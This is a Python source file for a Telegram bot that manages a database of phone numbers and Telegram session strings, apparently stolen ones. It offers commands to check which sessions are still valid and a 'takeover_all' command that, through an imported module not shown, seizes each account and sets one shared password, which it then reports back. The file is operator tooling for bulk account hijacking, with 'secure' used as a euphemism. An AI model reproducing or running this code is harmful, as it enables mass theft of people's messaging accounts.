import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import asyncio
from database import DatabaseManager
from account_manager import AccountManager
from config import BOT_TOKEN, DEFAULT_PASSWORD

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AccountBot:
    def __init__(self):
        self.db = DatabaseManager()
        self.app = Application.builder().token(BOT_TOKEN).build()
        self.setup_handlers()
    
    def setup_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("accounts", self.list_accounts))
        self.app.add_handler(CommandHandler("takeover_all", self.takeover_all))
        self.app.add_handler(CommandHandler("test_all", self.test_all_sessions))
        self.app.add_handler(CallbackQueryHandler(self.button_handler))
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton("📋 List Accounts", callback_data="list_accounts")],
            [InlineKeyboardButton("🔐 Test All Sessions", callback_data="test_all")],
            [InlineKeyboardButton("🚀 Takeover All", callback_data="takeover_all")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🤖 Account Manager Bot\n\n"
            "Commands:\n"
            "/accounts - List all accounts\n"
            "/test_all - Test session validity\n"
            "/takeover_all - Secure all accounts\n\n"
            "Or use buttons below:",
            reply_markup=reply_markup
        )
    
    async def list_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        accounts = self.db.get_all_accounts()
        
        if not accounts:
            await update.message.reply_text("❌ No accounts found")
            return
        
        response = "📋 All Accounts:\n\n"
        for i, acc in enumerate(accounts, 1):
            phone = acc.get('phone_number', 'N/A')
            status = acc.get('status', 'unknown')
            has_2fa = acc.get('has_2fa', False)
            
            response += f"{i}. `{phone}`\n"
            response += f"   Status: {status}\n"
            response += f"   2FA: {'✅' if has_2fa else '❌'}\n"
            response += "   ────────\n"
        
        # Split long messages
        if len(response) > 4096:
            for x in range(0, len(response), 4096):
                await update.message.reply_text(response[x:x+4096], parse_mode='Markdown')
        else:
            await update.message.reply_text(response, parse_mode='Markdown')
    
    async def takeover_all(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("🔄 Starting takeover process...")
        
        accounts = self.db.get_all_accounts()
        success_count = 0
        
        for account in accounts:
            phone = account.get('phone_number')
            session = account.get('session_string')
            
            if not phone or not session:
                continue
            
            status_msg = await update.message.reply_text(f"🔐 Processing {phone}...")
            
            success, result = await AccountManager.takeover_account(session, phone)
            
            if success:
                self.db.update_account_status(phone, "secured", True)
                await status_msg.edit_text(f"✅ {phone} - Secured!\n🔑 Password: {DEFAULT_PASSWORD}")
                success_count += 1
            else:
                self.db.update_account_status(phone, f"failed: {result}", False)
                await status_msg.edit_text(f"❌ {phone} - Failed: {result}")
            
            await asyncio.sleep(2)  # Rate limiting
        
        await update.message.reply_text(f"📊 Complete! {success_count}/{len(accounts)} accounts secured")
    
    async def test_all_sessions(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("🔍 Testing all sessions...")
        
        accounts = self.db.get_all_accounts()
        valid_count = 0
        
        for account in accounts:
            phone = account.get('phone_number')
            session = account.get('session_string')
            
            if not session:
                continue
            
            success, result = await AccountManager.test_session(session)
            
            if success:
                valid_count += 1
                self.db.update_account_status(phone, "valid", False)
            else:
                self.db.update_account_status(phone, "invalid", False)
        
        await update.message.reply_text(f"🧪 Session Test Results:\n✅ Valid: {valid_count}\n❌ Invalid: {len(accounts) - valid_count}")
    
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data == "list_accounts":
            await self.list_accounts_callback(query)
        elif query.data == "test_all":
            await self.test_all_callback(query)
        elif query.data == "takeover_all":
            await self.takeover_all_callback(query)
    
    async def list_accounts_callback(self, query):
        await self.list_accounts(query, None)
    
    async def test_all_callback(self, query):
        await self.test_all_sessions(query, None)
    
    async def takeover_all_callback(self, query):
        await self.takeover_all(query, None)
    
    def run(self):
        logger.info("🤖 Bot is running...")
        self.app.run_polling()

if __name__ == "__main__":
    bot = AccountBot()
    bot.run()
